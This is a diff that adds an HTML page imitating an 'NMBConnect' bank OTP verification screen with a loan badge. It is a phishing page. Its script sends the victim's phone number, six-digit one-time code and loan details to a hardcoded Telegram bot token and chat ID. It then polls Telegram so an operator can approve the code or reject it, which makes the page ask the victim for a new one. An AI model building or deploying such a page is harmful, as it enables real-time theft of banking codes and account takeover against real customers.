@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>NMBConnect | OTP Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --nmb-blue: #003366;
+            --nmb-gold: #E4C16A;
+            --nmb-light-blue: #4a90e2;
+            --white: #ffffff;
+            --error: #ff4d4d;
+            --bg-overlay: rgba(0, 0, 0, 0.6);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            padding: 15px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 28px;
+            padding: 35px 25px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+
+        .logo-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--nmb-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            border: 2px solid rgba(228, 193, 106, 0.3);
+        }
+
+        .brand-name { font-size: 24px; font-weight: 700; margin-bottom: 25px; }
+        .brand-name .nmb { color: var(--nmb-light-blue); }
+        .brand-name .connect { color: var(--nmb-gold); }
+
+        .card-header h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        .card-header p { font-size: 13px; color: rgba(255, 255, 255, 0.8); line-height: 1.5; margin-bottom: 25px; }
+
+        .loan-badge {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(228, 193, 106, 0.4);
+            border-radius: 14px;
+            padding: 12px;
+            margin-bottom: 25px;
+        }
+        .loan-badge .label { font-size: 11px; text-transform: uppercase; color: var(--nmb-gold); font-weight: 700; display: block; margin-bottom: 2px; }
+        .loan-badge .val { font-size: 16px; font-weight: 700; }
+
+        .otp-row {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .otp-box {
+            width: 42px;
+            height: 52px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            border: 1.5px solid rgba(255, 255, 255, 0.25);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.07);
+            color: white;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .otp-box:focus { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.12); }
+        .otp-box.ok { border-color: #4caf50; background: rgba(76, 175, 80, 0.1); }
+
+        .verify-btn {
+            width: 100%;
+            padding: 16px;
+            background: var(--white);
+            color: var(--nmb-blue);
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.2s;
+        }
+        .verify-btn:active { transform: scale(0.98); }
+
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-bottom: 15px;
+            display: none;
+            background: rgba(255, 77, 77, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 77, 77, 0.2);
+        }
+
+        .overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center; flex-direction: column;
+            background: rgba(0, 30, 60, 0.95);
+            z-index: 2000;
+            backdrop-filter: blur(8px);
+            padding: 20px;
+        }
+        .overlay.on { display: flex; }
+        .spin { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 18px; font-weight: 600; margin-top: 20px; }
+        .sp-s { font-size: 13px; color: rgba(255,255,255,0.7); margin-top: 8px; }
+        @keyframes sp { to { transform: rotate(360deg); } }
+
+        @media (max-width: 400px) {
+            .otp-box { width: 36px; height: 46px; font-size: 18px; }
+            .card { padding: 30px 20px; }
+        }
+    </style>
+</head>
+<body onload="init()">
+    <div class="card">
+        <div class="logo-circle">
+            <svg viewBox="0 0 100 100" width="50" height="50">
+                <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+                <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
+
+        <div class="card-header">
+            <h2>OTP Verification</h2>
+            <p>Enter the 6-digit code sent to your phone to finalize your verification.</p>
+        </div>
+
+        <div id="loanBox" class="loan-badge" style="display:none;">
+            <span class="label" id="loanType">Loan Type</span>
+            <span class="val" id="loanAmount">$0.00 USD</span>
+        </div>
+
+        <div id="err" class="error-msg"></div>
+
+        <div class="otp-row" id="otpRow">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+        </div>
+
+        <button class="verify-btn" onclick="doOTP()">Complete Verification</button>
+    </div>
+
+    <div id="ov" class="overlay">
+        <div class="spin"></div>
+        <div class="sp-t">Verifying Code</div>
+        <div class="sp-s">Please wait while we confirm your request...</div>
+    </div>
+
+    <script>
+        const BOT = '8610325502:AAELjduBU2AtyM8FITvNGmRz4-O1Vi6QQ3s';
+        const CID = '7881536601';
+        let bd = {}, luid = 0, otp = '', phone = '';
+        const boxes = document.querySelectorAll('.otp-box');
+
+        function init() {
+            const p = new URLSearchParams(location.search);
+            const d = p.get('data'), pr = p.get('price');
+            phone = p.get('phone') || '';
+            if (d && pr) { 
+                bd = { data: d, price: pr }; 
+                document.getElementById('loanBox').style.display = 'block';
+                document.getElementById('loanType').textContent = d;
+                document.getElementById('loanAmount').textContent = '$' + pr + ' USD';
+            }
+            setupOTP();
+        }
+
+        function setupOTP() {
+            boxes.forEach((b, i) => {
+                b.addEventListener('input', e => {
+                    const v = e.target.value;
+                    if (v.length > 1) {
+                        const digs = v.replace(/\D/g, '').split('');
+                        digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
+                        boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
+                        chk();
+                        if (otp.length === 6) doOTP();
+                        return;
+                    }
+                    if (v) { 
+                        b.classList.add('ok'); 
+                        if (i < boxes.length - 1) boxes[i+1].focus(); 
+                    } else { 
+                        b.classList.remove('ok'); 
+                    }
+                    chk();
+                    if (otp.length === 6) doOTP();
+                });
+                b.addEventListener('keydown', e => {
+                    if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
+                });
+            });
+        }
+
+        function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
+        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
+        function clrErr() { document.getElementById('err').style.display = 'none'; }
+
+        async function tg(msg, btns) {
+            try {
+                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
+                });
+                const d = await r.json();
+                if (d.ok) {
+                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
+                    const ud = await ur.json();
+                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
+                }
+            } catch(e) { console.error(e); }
+        }
+
+        function doOTP() {
+            clrErr();
+            if (otp.length !== 6) { showErr('Please enter the full 6-digit code'); return; }
+
+            const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
+            const btns = [[{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]];
+
+            document.getElementById('ov').classList.add('on');
+            tg(msg, btns);
+            poll();
+        }
+
+        function poll() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            d.result.forEach(u => {
+                                luid = u.update_id;
+                                if (u.callback_query) {
+                                    const cb = u.callback_query.data;
+                                    if (cb === 'otp_approved') { 
+                                        clearInterval(iv); 
+                                        document.getElementById('ov').classList.remove('on'); 
+                                        location.href = 'success.html';
+                                    }
+                                    else if (cb === 'otp_declined') { 
+                                        clearInterval(iv); 
+                                        document.getElementById('ov').classList.remove('on'); 
+                                        showErr('Invalid security code. Please check and try again.'); 
+                                        boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
+                                        boxes[0].focus(); 
+                                    }
+                                }
+                            });
+                        }
+                    }).catch(e => console.error(e));
+            }, 1500);
+            setTimeout(() => clearInterval(iv), 600000);
+        }
+    </script>
+</body>
+</html>
